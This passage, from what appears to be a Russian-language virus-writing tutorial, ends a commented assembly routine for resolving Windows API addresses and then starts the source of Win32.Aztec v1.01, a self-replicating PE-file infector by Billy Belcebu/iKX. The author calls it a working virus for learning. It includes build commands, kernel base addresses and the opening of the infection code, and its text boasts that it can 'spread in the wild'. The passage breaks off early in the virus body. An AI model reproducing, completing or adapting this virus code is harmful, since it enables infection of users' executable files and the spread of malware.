 ; INPUT  . ESI : &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1080;&#1084;&#1103; &#1087;&#1077;&#1088;&#1074;&#1086;&#1081; &#1078;&#1077;&#1083;&#1072;&#1077;&#1084;&#1086;&#1081; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1074; &#1092;&#1086;&#1088;&#1084;&#1072;&#1090;&#1077;    ;
 ;                ASCIIz                                                    ;
 ;        . EDI : &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1091;&#1102;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1080;&#1090; &#1087;&#1077;&#1088;&#1074;&#1091;&#1102; &#1078;&#1077;&#1083;&#1072;&#1077;&#1084;&#1091;&#1102; ;
 ;                API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1102;                                               ;
 ; OUTPUT . &#1053;&#1080;&#1095;&#1077;&#1075;&#1086;                                                          ;
 ;                                                                          ;
 ; &#1044;&#1083;&#1103; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103; &#1074;&#1089;&#1077;&#1093; &#1101;&#1090;&#1080;&#1093; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1081; &#1103; &#1073;&#1091;&#1076;&#1091; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1091;&#1102; &#1089;&#1090;&#1088;&#1091;&#1082;&#1090;&#1091;&#1088;&#1091;:;
 ;                                                                          ;
 ; ESI &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; --. db         &quot;FindFirstFileA&quot;,0                       ;
 ;                      db         &quot;FindNextFileA&quot;,0                        ;
 ;                      db         &quot;CloseHandle&quot;,0                          ;
 ;                      [...]                                               ;
 ;                      db         0BBh ; &#1054;&#1090;&#1084;&#1077;&#1095;&#1072;&#1077;&#1090; &#1082;&#1086;&#1085;&#1077;&#1094; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074;&#1072;            ;
 ;                                                                          ;
 ; EDI &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; --. dd         00000000h ; &#1041;&#1091;&#1076;&#1091;&#1097;&#1080;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; FFFA           ;
 ;                      dd         00000000h ; &#1041;&#1091;&#1076;&#1091;&#1097;&#1080;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; FNFA           ;
 ;                      dd         00000000h ; &#1041;&#1091;&#1076;&#1091;&#1097;&#1080;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; CH             ;
 ;                      [...]                                               ;
 ;                                                                          ;
 ; &#1071; &#1085;&#1072;&#1076;&#1077;&#1102;&#1089;&#1100;, &#1095;&#1090;&#1086; &#1074;&#1099; &#1076;&#1086;&#1089;&#1090;&#1072;&#1090;&#1086;&#1095;&#1085;&#1086; &#1091;&#1084;&#1085;&#1099; &#1080; &#1087;&#1086;&#1085;&#1103;&#1083;&#1080;, &#1086; &#1095;&#1077;&#1084; &#1103; &#1075;&#1086;&#1074;&#1086;&#1088;&#1102;.              ;
 ;-------------------------------------;

 @@1:   push    esi
        push    edi
        call    GetAPI
        pop     edi
        pop     esi
        stosd

 ;-------------------------------------;
 ; &#1052;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1086;&#1073;&#1088;&#1072;&#1073;&#1072;&#1090;&#1099;&#1074;&#1072;&#1077;&#1084;&#1099;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103; &#1074; &#1089;&#1090;&#1077;&#1082;, &#1095;&#1090;&#1086;&#1073;&#1099; &#1080;&#1079;&#1073;&#1077;&#1078;&#1072;&#1090;&#1100; &#1080;&#1093; &#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1086;&#1075;&#1086; ;
 ; &#1080;&#1079;&#1084;&#1077;&#1085;&#1077;&#1085;&#1080;&#1103;, &#1072; &#1079;&#1072;&#1090;&#1077;&#1084; &#1074;&#1099;&#1079;&#1099;&#1074;&#1072;&#1077;&#1084; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1091; GetAPI. &#1047;&#1076;&#1077;&#1089;&#1100; &#1084;&#1099; &#1087;&#1088;&#1077;&#1076;&#1087;&#1086;&#1083;&#1072;&#1075;&#1072;&#1077;&#1084;, &#1095;&#1090;&#1086; ;
 ; ESI &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1080;&#1084;&#1103; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1084;&#1086;&#1081; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;, &#1072; EDI - &#1101;&#1090;&#1086; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072;     ;
 ; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1091;&#1102;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103; &#1073;&#1091;&#1076;&#1077;&#1090; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1072;&#1090;&#1100; &#1080;&#1084;&#1103; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;. &#1058;&#1072;&#1082; &#1082;&#1072;&#1082; &#1084;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; ;
 ; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1074; EAX, &#1084;&#1099; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1084; &#1077;&#1075;&#1086; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1074; &#1089;&#1086;&#1086;&#1090;&#1074;&#1077;&#1090;&#1089;&#1090;&#1074;&#1091;&#1102;&#1097;&#1077;&#1081;  ;
 ; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1086;&#1081;, &#1085;&#1072; &#1082;&#1086;&#1090;&#1086;&#1088;&#1091;&#1102; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077; EDI &#1089; &#1087;&#1086;&#1084;&#1086;&#1097;&#1100;&#1102; STOSD.                     ;
 ;-------------------------------------;

 @@2:   cmp     byte ptr [esi],0
        jz      @@3
        inc     esi
        jmp     @@2
 @@3:   cmp     byte ptr [esi+1],0BBh
        jz      @@4
        inc     esi
        jmp     @@1
 @@4:   ret
 GetAPIs        endp

 ;-------------------------------------;
 ; &#1071; &#1079;&#1085;&#1072;&#1102;, &#1101;&#1090;&#1086; &#1084;&#1086;&#1078;&#1085;&#1086; &#1073;&#1099;&#1083;&#1086; &#1089;&#1076;&#1077;&#1083;&#1072;&#1090;&#1100; &#1075;&#1086;&#1088;&#1072;&#1079;&#1076;&#1086; &#1073;&#1086;&#1083;&#1077;&#1077; &#1086;&#1087;&#1090;&#1080;&#1084;&#1080;&#1079;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1086;, &#1085;&#1086; &#1074;&#1087;&#1086;&#1083;&#1085;&#1077;  ;
 ; &#1075;&#1086;&#1076;&#1080;&#1090;&#1100;&#1089;&#1103; &#1074; &#1082;&#1072;&#1095;&#1077;&#1089;&#1090;&#1074;&#1077; &#1087;&#1088;&#1080;&#1084;&#1077;&#1085;&#1072;. &#1051;&#1072;&#1076;&#1085;&#1086;, &#1089;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1076;&#1086;&#1093;&#1086;&#1076;&#1080;&#1084; &#1076;&#1086; &#1082;&#1086;&#1085;&#1094;&#1072; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080;,  ;
 ; &#1095;&#1077;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; &#1084;&#1099; &#1079;&#1072;&#1087;&#1088;&#1072;&#1096;&#1080;&#1074;&#1072;&#1083;&#1080; &#1088;&#1072;&#1085;&#1077;&#1077;, &#1080; &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1086;&#1085;&#1072; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1091;&#1102;      ;
 ; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1102;. &#1053;&#1086; &#1085;&#1072;&#1084; &#1085;&#1091;&#1078;&#1085;&#1086; &#1091;&#1079;&#1085;&#1072;&#1090;&#1100;, &#1075;&#1076;&#1077; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1085;&#1103;&#1103; &#1080;&#1079; &#1085;&#1080;&#1093;,        ;
 ; &#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1084;&#1099; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1084;, &#1085;&#1077; &#1085;&#1072;&#1081;&#1076;&#1077;&#1085; &#1083;&#1080; &#1073;&#1072;&#1081;&#1090; 0BBh (&#1085;&#1072;&#1096;&#1072; &#1084;&#1077;&#1090;&#1082;&#1072; &#1082;&#1086;&#1085;&#1094;&#1072; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074;&#1072;). ;
 ; &#1045;&#1089;&#1083;&#1080; &#1101;&#1090;&#1086; &#1090;&#1072;&#1082;, &#1084;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1083;&#1080; &#1074;&#1089;&#1077; &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1099;&#1077; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;, &#1072; &#1077;&#1089;&#1083;&#1080; &#1085;&#1077;&#1090;,       ;
 ; &#1087;&#1088;&#1086;&#1076;&#1086;&#1083;&#1078;&#1072;&#1077;&#1084; &#1087;&#1086;&#1080;&#1089;&#1082;.                                                        ;
 ;-------------------------------------;

;---[ CUT HERE ]-------------------------------------------------------------</b></font></pre>
<!--mstheme--><font face="Arial, Arial, Helvetica"></code>
<p>&#1061;&#1077;&#1093;, &#1103; &#1089;&#1076;&#1077;&#1083;&#1072;&#1083;
&#1101;&#1090;&#1080;
&#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1091;
&#1082;&#1072;&#1082; &#1084;&#1086;&#1078;&#1085;&#1086;
&#1087;&#1088;&#1086;&#1097;&#1077; &#1080;
&#1093;&#1086;&#1088;&#1086;&#1096;&#1077;&#1085;&#1100;&#1082;&#1086;
&#1080;&#1093;
&#1086;&#1090;&#1082;&#1086;&#1084;&#1084;&#1077;&#1085;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1083;,
&#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1103;
&#1086;&#1078;&#1080;&#1076;&#1072;&#1102;, &#1095;&#1090;&#1086; &#1074;&#1099;
&#1087;&#1086;&#1085;&#1103;&#1083;&#1080; &#1089;&#1091;&#1090;&#1100;.
&#1045;&#1089;&#1083;&#1080; &#1085;&#1077;&#1090;, &#1090;&#1086;
&#1101;&#1090;&#1086; &#1085;&#1077; &#1084;&#1086;&#1080;
&#1087;&#1088;&#1086;&#1073;&#1083;&#1077;&#1084;&#1099;... &#1053;&#1086;
&#1090;&#1077;&#1087;&#1077;&#1088;&#1100;
&#1087;&#1086;&#1103;&#1074;&#1083;&#1103;&#1077;&#1090;&#1089;&#1103;
&#1074;&#1086;&#1087;&#1088;&#1086;&#1089;, &#1082;&#1072;&#1082;&#1080;&#1077;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1085;&#1072;&#1084;
&#1089;&#1083;&#1077;&#1076;&#1091;&#1077;&#1090;
&#1080;&#1089;&#1082;&#1072;&#1090;&#1100;? &#1053;&#1080;&#1078;&#1077; &#1103;
&#1087;&#1088;&#1080;&#1074;&#1077;&#1076;&#1091;
&#1080;&#1089;&#1093;&#1086;&#1076;&#1085;&#1099;&#1081; &#1082;&#1086;&#1076;
&#1088;&#1072;&#1085;&#1090;&#1072;&#1081;&#1084;&#1086;&#1074;&#1086;&#1075;&#1086;
(&#1074;&#1088;&#1077;&#1084;&#1077;&#1085;&#1080;
&#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1077;&#1085;&#1080;&#1103;)
&#1074;&#1080;&#1088;&#1091;&#1089;&#1072;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1091;&#1077;&#1090;
&#1090;&#1077;&#1093;&#1085;&#1080;&#1082;&#1091;
&#1092;&#1072;&#1081;&#1083;&#1086;&#1074;&#1086;&#1075;&#1086;
&#1084;&#1101;&#1087;&#1087;&#1080;&#1085;&#1075;&#1072; (&#1073;&#1086;&#1083;&#1077;&#1077;
&#1087;&#1088;&#1086;&#1089;&#1090;&#1086;&#1081; &#1080;
&#1073;&#1099;&#1089;&#1090;&#1088;&#1099;&#1081; &#1087;&#1091;&#1090;&#1100;
&#1084;&#1072;&#1085;&#1080;&#1087;&#1091;&#1083;&#1103;&#1094;&#1080;&#1081;
&#1080; &#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1080;&#1103;
&#1092;&#1072;&#1081;&#1083;&#1086;&#1074;).
<p><strong>&#1055;&#1088;&#1080;&#1084;&#1077;&#1088;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1072;</strong></p>
<p>&#1053;&#1077; &#1076;&#1091;&#1084;&#1072;&#1081;&#1090;&#1077;,
&#1095;&#1090;&#1086; &#1103;
&#1089;&#1091;&#1084;&#1072;&#1089;&#1096;&#1077;&#1076;&#1096;&#1080;&#1081;.
&#1071; &#1087;&#1086;&#1084;&#1077;&#1097;&#1091;
&#1079;&#1076;&#1077;&#1089;&#1100; &#1082;&#1086;&#1076;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1072; &#1076;&#1083;&#1103;
&#1090;&#1086;&#1075;&#1086;, &#1095;&#1090;&#1086;&#1073;&#1099;
&#1080;&#1079;&#1073;&#1077;&#1078;&#1072;&#1090;&#1100;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1086;&#1074;&#1072;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;&#1075;&#1086;
&#1086;&#1087;&#1080;&#1089;&#1072;&#1085;&#1080;&#1103;
&#1074;&#1089;&#1077;&#1093; &#1101;&#1090;&#1080;&#1093; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081;,
&#1072;
&#1087;&#1088;&#1086;&#1076;&#1077;&#1084;&#1086;&#1085;&#1089;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1080;&#1093; &#1074; &#1076;&#1077;&#1081;&#1089;&#1090;&#1074;&#1080;&#1080;
:). &#1069;&#1090;&#1086;&#1090; &#1074;&#1080;&#1088;&#1091;&#1089; -
&#1086;&#1076;&#1085;&#1086; &#1080;&#1079; &#1084;&#1086;&#1080;&#1093;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1085;&#1080;&#1093;
&#1089;&#1086;&#1079;&#1076;&#1072;&#1085;&#1080;&#1081;. &#1052;&#1085;&#1077;
&#1087;&#1086;&#1090;&#1088;&#1077;&#1073;&#1086;&#1074;&#1072;&#1083;&#1089;&#1103;
&#1086;&#1076;&#1080;&#1085; &#1076;&#1077;&#1085;&#1100;,
&#1095;&#1090;&#1086;&#1073;&#1099; &#1077;&#1075;&#1086;
&#1079;&#1072;&#1082;&#1086;&#1085;&#1095;&#1080;&#1090;&#1100;: &#1086;&#1085;
&#1086;&#1089;&#1085;&#1086;&#1074;&#1099;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103;
&#1085;&#1072; Win95.Iced Earth, &#1085;&#1086; &#1073;&#1077;&#1079;
&#1073;&#1072;&#1075;&#1086;&#1074; &#1080;
&#1089;&#1087;&#1077;&#1094;&#1080;&#1072;&#1083;&#1100;&#1085;&#1099;&#1093;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081;.
&#1053;&#1072;&#1089;&#1083;&#1072;&#1078;&#1076;&#1072;&#1081;&#1090;&#1077;&#1089;&#1100;
Win32.Aztec! (&#1044;&#1072;, Win32!!!).
<p><code><!--mstheme--></font>
<pre><font size="2"><b>;---[ CUT HERE ]-------------------------------------------------------------
; [Win32.Aztec v1.01] - Bugfixed lite version of Iced Earth
; Copyright (c) 1999 by Billy Belcebu/iKX
;
; &#1048;&#1084;&#1103; &#1074;&#1080;&#1088;&#1091;&#1089;&#1072;    : Aztec v1.01
; &#1040;&#1074;&#1090;&#1086;&#1088; &#1074;&#1080;&#1088;&#1091;&#1089;&#1072;  : Billy Belcebu/iKX
; &#1055;&#1088;&#1086;&#1080;&#1089;&#1093;&#1086;&#1078;&#1076;&#1077;&#1085;&#1080;&#1077; : &#1048;&#1089;&#1087;&#1072;&#1085;&#1080;&#1103;
; &#1055;&#1083;&#1072;&#1090;&#1092;&#1086;&#1088;&#1084;&#1072;     : Win32
; &#1052;&#1080;&#1096;&#1077;&#1085;&#1100;        : PE files
; &#1050;&#1086;&#1084;&#1087;&#1080;&#1083;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;: TASM 5.0 &#1080; TLINK 5.0
;                       tasm32 /ml /m3 aztec,,;
;                       tlink32 /Tpe /aa /c /v aztec,aztec,,import32.lib,
;                       pewrsec aztec.exe
; &#1055;&#1088;&#1080;&#1084;&#1077;&#1095;&#1072;&#1085;&#1080;&#1077;    : &#1053;&#1080;&#1095;&#1077;&#1075;&#1086; &#1086;&#1089;&#1086;&#1073;&#1077;&#1085;&#1085;&#1086;&#1075;&#1086; &#1074; &#1101;&#1090;&#1086;&#1090; &#1088;&#1072;&#1079;. &#1055;&#1088;&#1086;&#1089;&#1090;&#1086; &#1087;&#1086;&#1092;&#1080;&#1082;&#1089;&#1077;&#1085;&#1099; &#1073;&#1072;&#1075;&#1080; &#1074;&#1080;&#1088;&#1091;&#1089;&#1072;
;                 Iced Earth &#1080; &#1091;&#1073;&#1088;&#1072;&#1085;&#1099; &#1086;&#1089;&#1086;&#1073;&#1099;&#1077; &#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1086;&#1089;&#1090;&#1077;. &#1069;&#1090;&#1086; &#1076;&#1077;&#1081;&#1089;&#1090;&#1074;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;
;                 &#1074;&#1080;&#1088;&#1091;&#1089; &#1076;&#1083;&#1103; &#1086;&#1073;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103;.
; &#1055;&#1086;&#1095;&#1077;&#1084;&#1091; Aztec? : &#1055;&#1086;&#1095;&#1077;&#1084;&#1091; &#1074;&#1080;&#1088;&#1091;&#1089; &#1085;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103; &#1080;&#1084;&#1077;&#1085;&#1085;&#1086; &#1090;&#1072;&#1082;? &#1052;&#1085;&#1086;&#1075;&#1086; &#1087;&#1088;&#1080;&#1095;&#1080;&#1085;:
;                  &#1056;&#1072;&#1079; &#1091;&#1078; &#1077;&#1089;&#1090;&#1100; &#1074;&#1080;&#1088;&#1091;&#1089; Inca &#1080; &#1074;&#1080;&#1088;&#1091;&#1089; Maya... ;)
;                  &#1071; &#1078;&#1080;&#1083; &#1074; &#1052;&#1077;&#1082;&#1089;&#1080;&#1082;&#1077; &#1096;&#1077;&#1089;&#1090;&#1100; &#1084;&#1077;&#1089;&#1103;&#1094;&#1077;&#1074;
;                  &#1071; &#1085;&#1077;&#1085;&#1072;&#1074;&#1080;&#1078;&#1091; &#1092;&#1072;&#1096;&#1080;&#1089;&#1090;&#1089;&#1082;&#1080;&#1077; &#1084;&#1077;&#1090;&#1086;&#1076;&#1099;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1083; &#1050;&#1086;&#1088;&#1090;&#1077;&#1089;
;                  &#1076;&#1083;&#1103; &#1090;&#1086;&#1075;&#1086;, &#1095;&#1090;&#1086;&#1073;&#1099; &#1086;&#1090;&#1073;&#1080;&#1088;&#1072;&#1090;&#1100; &#1090;&#1077;&#1088;&#1088;&#1080;&#1090;&#1086;&#1088;&#1080;&#1080; &#1091; &#1072;&#1094;&#1090;&#1077;&#1082;&#1086;&#1074;
;                  &#1052;&#1085;&#1077; &#1085;&#1088;&#1072;&#1074;&#1080;&#1090;&#1089;&#1103; &#1080;&#1093; &#1084;&#1080;&#1092;&#1086;&#1083;&#1086;&#1075;&#1080;&#1103; ;)
;                  &#1052;&#1086;&#1103; &#1086;&#1090;&#1089;&#1090;&#1086;&#1081;&#1085;&#1072;&#1103; &#1079;&#1074;&#1091;&#1082;&#1086;&#1074;&#1072;&#1103; &#1082;&#1072;&#1088;&#1090;&#1072; &#1085;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103; Aztec :)
;                  &#1071; &#1083;&#1102;&#1073;&#1083;&#1102; Salma Hayek! :)~
;                  KidChaos - &#1101;&#1090;&#1086; &#1076;&#1088;&#1091;&#1075; :)
; &#1055;&#1086;&#1079;&#1076;&#1088;&#1072;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103;  : &#1061;&#1086;&#1088;&#1086;&#1096;&#1086;, &#1074; &#1101;&#1090;&#1086;&#1090; &#1088;&#1072;&#1079; &#1087;&#1086;&#1076;&#1079;&#1076;&#1088;&#1072;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1083;&#1102;&#1076;&#1103;&#1084; &#1080;&#1079; EZLN &#1080;
;                 MRTA.
;
; (c) 1999 Billy Belcebu/iKX

        .386p                                   ; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1090;&#1089;&#1103; 386+ =)
        .model  flat                            ; 32-&#1093; &#1073;&#1080;&#1090;&#1085;&#1099;&#1077; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1099; &#1073;&#1077;&#1079;
                                                ; &#1089;&#1077;&#1075;&#1084;&#1077;&#1085;&#1090;&#1086;&#1074;
        jumps                                   ; &#1063;&#1090;&#1086;&#1073;&#1099; &#1080;&#1079;&#1073;&#1077;&#1078;&#1072;&#1090;&#1100; &#1087;&#1077;&#1088;&#1077;&#1093;&#1086;&#1076;&#1086;&#1074; &#1079;&#1072;
                                                ; &#1087;&#1088;&#1077;&#1076;&#1077;&#1083;&#1099; &#1075;&#1088;&#1072;&#1085;&#1080;&#1094;&#1099;

extrn   MessageBoxA:PROC                        ; &#1048;&#1084;&#1087;&#1086;&#1088;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1086; 1-&#1086;&#1077;
                                                ; &#1087;&#1086;&#1082;&#1086;&#1083;&#1077;&#1085;&#1080;&#1077;
extrn   ExitProcess:PROC                        ; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; :)

; Some equates useful for the virus

virus_size      equ     (offset virus_end-offset virus_start)
heap_size       equ     (offset heap_end-offset heap_start)
total_size      equ     virus_size+heap_size
shit_size       equ     (offset delta-offset aztec)

; &#1046;&#1077;&#1089;&#1090;&#1082;&#1086; &#1079;&#1072;&#1076;&#1072;&#1077;&#1090;&#1089;&#1103; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1076;&#1083;&#1103; &#1087;&#1077;&#1088;&#1074;&#1086;&#1075;&#1086; &#1087;&#1086;&#1082;&#1086;&#1083;&#1077;&#1085;&#1080;&#1103;, &#1085;&#1077; &#1073;&#1077;&#1089;&#1087;&#1086;&#1082;&#1086;&#1081;&#1090;&#1077;&#1089;&#1100; ;)

kernel_         equ     0BFF70000h
kernel_wNT      equ     077F00000h

        .data

szTitle         db      &quot;[Win32.Aztec v1.01]&quot;,0

szMessage       db      &quot;Aztec is a bugfixed version of my Iced Earth&quot;,10
                db      &quot;virus, with some optimizations and with some&quot;,10
                db      &quot;'special' features removed. Anyway, it will&quot;,10
                db      &quot;be able to spread in the wild succefully :)&quot;,10,10
                db      &quot;(c) 1999 by Billy Belcebu/iKX&quot;,0

 ;-------------------------------------;
 ; &#1042;&#1089;&#1077; &#1101;&#1090;&#1086; &#1086;&#1090;&#1089;&#1090;&#1086;&#1081;: &#1085;&#1077;&#1089;&#1082;&#1086;&#1083;&#1100;&#1082;&#1086; &#1084;&#1072;&#1082;&#1088;&#1086;&#1089;&#1086;&#1074;, &#1095;&#1090;&#1086;&#1073;&#1099; &#1089;&#1076;&#1077;&#1083;&#1072;&#1090;&#1100; &#1082;&#1086;&#1076; &#1073;&#1086;&#1083;&#1077;&#1077; &#1087;&#1086;&#1085;&#1103;&#1090;&#1085;&#1099;&#1084;,
 ; &#1082;&#1086;&#1077;-&#1095;&#1090;&#1086; &#1076;&#1083;&#1103; &#1087;&#1077;&#1088;&#1074;&#1086;&#1075;&#1086; &#1087;&#1086;&#1082;&#1086;&#1083;&#1077;&#1085;&#1080;&#1103; &#1080; &#1090;.&#1076;.
 ;-------------------------------------;

        .code

virus_start     label   byte

aztec:
        pushad                                  ; &#1055;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1074; &#1089;&#1090;&#1077;&#1082; &#1074;&#1089;&#1077;
                                                ; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1099;
        pushfd                                  ; &#1055;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1074; &#1089;&#1090;&#1077;&#1082; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;
                                                ; &#1092;&#1083;&#1072;&#1075;&#1086;&#1074;

        call    delta                           ; &#1057;&#1072;&#1084;&#1099;&#1081; &#1089;&#1083;&#1086;&#1078;&#1085;&#1099;&#1081; &#1076;&#1083;&#1103; &#1087;&#1086;&#1085;&#1080;&#1084;&#1072;&#1085;&#1080;&#1103;
                                                ; &#1082;&#1086;&#1076; ;)
delta:  pop     ebp
        mov     eax,ebp
        sub     ebp,offset delta

        sub     eax,shit_size                   ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1073;&#1072;&#1079;&#1091; &#1086;&#1073;&#1088;&#1072;&#1079;&#1072; &#1085;&#1072;
        sub     eax,00001000h                   ; &#1083;&#1077;&#1090;&#1091;
NewEIP  equ     $-4
        mov     dword ptr [ebp+ModBase],eax

 ;-------------------------------------;
 ; &#1054;&#1082;. &#1042;&#1086;-&#1087;&#1077;&#1088;&#1074;&#1099;&#1093;, &#1103; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1102; &#1074; &#1089;&#1090;&#1077;&#1082; &#1074;&#1089;&#1077; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1099; &#1080; &#1074;&#1089;&#1077; &#1092;&#1083;&#1072;&#1075;&#1080; (&#1085;&#1077; &#1087;&#1086;&#1090;&#1086;&#1084;&#1091; &#1095;&#1090;&#1086;  ;
 ; &#1101;&#1090;&#1086; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1090;&#1089;&#1103;, &#1072; &#1087;&#1086;&#1090;&#1086;&#1084;&#1091; &#1095;&#1090;&#1086; &#1103; &#1087;&#1088;&#1080;&#1074;&#1099;&#1082; &#1101;&#1090;&#1086; &#1074;&#1089;&#1077;&#1075;&#1076;&#1072; &#1076;&#1077;&#1083;&#1072;&#1090;&#1100;). &#1047;&#1072;&#1090;&#1077;&#1084; &#1103; &#1076;&#1077;&#1083;&#1072;&#1102;   ;
 ; &#1085;&#1077;&#1095;&#1090;&#1086; &#1086;&#1095;&#1077;&#1085;&#1100; &#1074;&#1072;&#1078;&#1085;&#1086;&#1077;. &#1044;&#1072;! &#1069;&#1090;&#1086; &#1076;&#1077;&#1083;&#1100;&#1090;&#1072;-&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077;! &#1052;&#1099; &#1076;&#1086;&#1083;&#1078;&#1085;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100; &#1077;&#1075;&#1086; &#1087;&#1086;   ;
 ; &#1086;&#1095;&#1077;&#1085;&#1100; &#1087;&#1088;&#1086;&#1089;&#1090;&#1086;&#1081; &#1087;&#1088;&#1080;&#1095;&#1080;&#1085;&#1077;: &#1084;&#1099; &#1085;&#1077; &#1079;&#1085;&#1072;&#1077;&#1084; &#1075;&#1076;&#1077; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1080;&#1089;&#1087;&#1086;&#1083;&#1085;&#1103;&#1102;&#1097;&#1080;&#1081;&#1089;&#1103; &#1082;&#1086;&#1076;. &#1071; &#1085;&#1077; ;
